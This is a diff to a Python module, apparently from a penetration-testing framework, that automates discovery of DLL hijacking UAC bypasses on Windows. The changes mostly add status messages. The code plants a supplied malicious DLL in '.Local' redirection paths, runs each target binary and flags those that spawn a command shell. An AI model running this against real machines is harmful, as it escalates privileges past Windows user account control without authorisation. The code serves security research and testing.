@@ -13,6 +13,7 @@ import time
 import subprocess
 import psutil
 import copy
+from termcolor import colored
 
 
 class CustomModule(Module):
@@ -39,16 +40,16 @@ class CustomModule(Module):
     # This module must be always implemented, it is called by the run option
     def run_module(self):
         self.init_import_modules()
+        print colored("[*] STARTING DLL HIJACKING DISCOVERY", 'yellow', attrs=['bold'])
         for b in self.binaries():
+            print colored("[*] Analizing binary: " + b + "...", 'yellow', attrs=['bold'])
             events = copy.deepcopy(self.p)
-            print "\n[*] Analizing binary: " + b
             events = Filter.by_process(events, b)
             events = Filter.by_operation(events, "CreateFile")
             for e in events['CreateFile']:
-                print e.find("Path")
                 path = e.find("Path").text
-                print path
                 if b + ".Local" in path:
+                    print "[*] Suspicious path found: " + path
                     self.handle_dll_local(path, b)
         self.results()
 
@@ -65,17 +66,21 @@ class CustomModule(Module):
             except:
                 pass
 
+            print "[+] Creating: " + path
             subprocess.check_call(
-                ["powershell", "-C", "mkdir", path])
+                ["powershell", "-C", "mkdir", path, ">", "$null"])
 
+            print "[+] Copying the malicious dll to the path"
             subprocess.check_call(
                 ["powershell", "-C", "cp", self.args["malicious_dll"], path])
 
             prev_pids = psutil.pids()
+            print "[*] Executing the binary"
             subprocess.check_call(["powershell", "-C", binary])
             time.sleep(1)
 
             if self.is_cmd_open(prev_pids):
+                print colored("[*] THIS BINARY IS VULNERABLE TO DLL HIJACKING UAC BYPASS!", 'cyan', attrs=['bold'])
                 if binary not in self._results["vulnerables"]:
                     self._results["vulnerables"].append(binary)
             else:
@@ -86,10 +91,9 @@ class CustomModule(Module):
 
             self.kill(binary, prev_pids, new_pids)
 
+            print "[-] Deleting the path and cleaning up\n"
             subprocess.check_call(
                 ["powershell", "-C", "rm", "-r", "-Force", subpath])
-
-            print "deleted"
 
         except subprocess.CalledProcessError as error:
             print "ERROR: COPYING THE FILE"
